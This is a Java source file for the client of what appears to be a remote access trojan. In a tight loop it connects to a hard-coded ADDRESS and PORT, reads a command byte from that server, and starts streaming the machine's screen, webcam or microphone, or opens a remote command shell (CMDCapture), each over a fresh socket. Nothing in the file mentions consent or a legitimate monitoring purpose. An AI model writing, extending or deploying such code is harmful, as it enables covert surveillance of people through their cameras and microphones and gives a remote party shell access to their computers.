package client;

import org.opencv.core.Core;
import org.opencv.core.Mat;
import org.opencv.videoio.VideoCapture;

import java.io.IOException;
import java.net.Socket;

public class Client extends ClientUtil {

    private Thread thread = new Thread(run(), "Client Thread");

    private org.opencv.videoio.VideoCapture capture;
    private Mat c_Mat;
    private Socket socket;
    private Socket pivotSocket;

    public static void main(String[] args) {
        System.loadLibrary(Core.NATIVE_LIBRARY_NAME);
        new Client();
    }

    public Client() {
        thread.start();
    }

    private Runnable run() {
        return () -> {
            capture = new VideoCapture(0);
            c_Mat = new Mat();
            while (thread.isAlive()) {
                try {
                    pivotSocket = new Socket(ADDRESS, PORT);
                } catch (IOException e) {
                    e.printStackTrace();
                }

                if (pivotSocket.isConnected()) {
                    try {
                        int read = pivotSocket.getInputStream().read();
                        if(read == 0){
                            socket = new Socket(ADDRESS, PORT);
                            new client.VideoCapture(socket);
                            pivotSocket.close();
                            socket.close();
                        }
                        if(read == 1){
                            socket = new Socket(ADDRESS, PORT);
                            new CameraCapture(socket, capture, c_Mat);
                            pivotSocket.close();
                            socket.close();
                        }
                        if(read == 2){
                            socket = new Socket(ADDRESS, PORT);
                            new AudioCapture(socket);
                            pivotSocket.close();
                            socket.close();
                        }
                        if(read == 3){
                            socket = new Socket(ADDRESS, PORT);
                            new CMDCapture(socket);
                            pivotSocket.close();
                            socket.close();
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }

                try {
                    Thread.sleep(1000 / 60);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        };
    }
}
